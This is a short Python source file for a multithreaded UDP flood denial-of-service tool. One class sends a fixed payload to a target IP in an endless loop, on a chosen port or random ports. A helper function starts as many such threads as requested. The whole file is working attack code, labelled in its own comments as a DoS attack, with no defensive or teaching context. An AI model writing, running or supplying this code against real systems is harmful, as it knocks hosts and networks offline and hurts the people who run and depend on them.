#!/usr/bin/python3

# Imports
import os
import sys
import getopt
import threading
import random
import socket

class UDPFlood(threading.Thread):
	"""Flood the target
	
	Methods:
		__init__() - Initialize the object
		run() - Start the DoS attack
	"""
	
	def __init__(self, target_ip, target_port):
		"""Initialize the object
		
		Arguments:
			self - object - The UDPFlood
			target_ip - string - The IP to flood
			target_port - integer - The port to flood
		"""
		
		# Append everything to self
		threading.Thread.__init__(self)
		self.target_ip = target_ip
		self.target_port = target_port
		
	def run(self):
		"""Start the DoS attack
		
		Arguments:
			self - object - The UDPFlood object
		"""
		
		# Create a socket
		with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as attack_socket:
			# Create infinite loop
			while True:
				# If the target port is random
				if int(self.target_port) == 0:
					# Send a packet to the target on a random port
					attack_socket.sendto(b"ABCDEFGHIJKLMNOPQRSTUVWXYZ", (self.target_ip, random.randint(1, 5000)))
				else:
					# Send a packet to the target on the specified port
					attack_socket.sendto(b"ABCDEFGHIJKLMNOPQRSTUVWXYZ", (self.target_ip, int(self.target_port)))
					
def begin(attack_threads, target_ip, target_port):
	"""Create attack threads
	
	Arguments:
		attack_threads - intiger - The number of threads
		target_ip - string - The IP to flood
		target_port - intiger - The port to flood
	"""
	
	# Create the threads
	for _ in range(int(attack_threads)):
		# Create the attack thread
		attack_thread = UDPFlood(target_ip, target_port)
		
		# Start the thread
		attack_thread.start()
